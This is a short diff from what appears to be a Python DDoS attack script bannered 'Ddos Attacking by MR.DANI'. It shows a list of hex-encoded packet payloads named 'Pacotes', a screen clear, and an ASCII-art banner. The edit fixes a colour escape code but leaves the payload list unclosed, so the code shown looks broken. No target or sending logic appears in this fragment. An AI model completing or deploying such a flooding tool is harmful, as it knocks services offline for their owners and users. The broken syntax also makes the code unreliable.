@@ -11,10 +11,10 @@ Pacotes = [
  codecs.decode('081e77da', 'hex_codec'),
  codecs.decode('081e4dda', 'hex_codec'),
  codecs.decode('021efd40', 'hex_codec'),
- codecs.decode('081e7eda', 'hex_codec')]
+ codecs.decode('081e7eda', 'hex_codec'),
 
 os.system("clear")
-print ('\xe2b[1m\x1b[31mDdos Attacking by MR.DANI')
+print ('\x1b[1m\x1b[31mDdos Attacking by MR.DANI')
 print ('███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗')
 print ('████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║')
 print ('██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║')
